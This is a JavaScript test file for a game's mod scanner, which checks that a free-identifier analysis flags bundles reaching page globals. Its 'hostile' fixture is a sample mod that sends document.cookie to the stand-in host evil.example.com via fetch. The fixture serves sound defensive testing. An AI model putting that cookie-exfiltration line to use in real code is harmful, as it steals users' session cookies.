// The game repo's side of the mod toolchain: the scanner that keeps a published bundle from reaching
// page globals. The registry's own tooling is tested in the spup-mods repo.

import {test} from "node:test";
import assert from "node:assert/strict";
import {freeIdentifiers} from "../../tools/mod-scan.js";

test("the free-variable scan catches a bundle reaching page globals", () => {
    const clean = `
        export function createDeclaration(sdk) {
            const {ObjectType} = sdk;
            const names = [1, 2].map(value => String(value));
            for (const name of names) {
                JSON.stringify({name});
            }
            try {
                Math.round(1.5);
            } catch (problem) {
                console.error(problem);
            }
            class Local extends ObjectType {}
            return new Local();
        }
    `;
    assert.deepEqual([...freeIdentifiers(clean).keys()], []);

    const hostile = `
        export function createClient(sdk) {
            fetch("https://evil.example.com", {body: document.cookie});
            return new sdk.AbstractClientMod();
        }
    `;
    assert.deepEqual([...freeIdentifiers(hostile).keys()].sort(), ["document", "fetch"]);
});
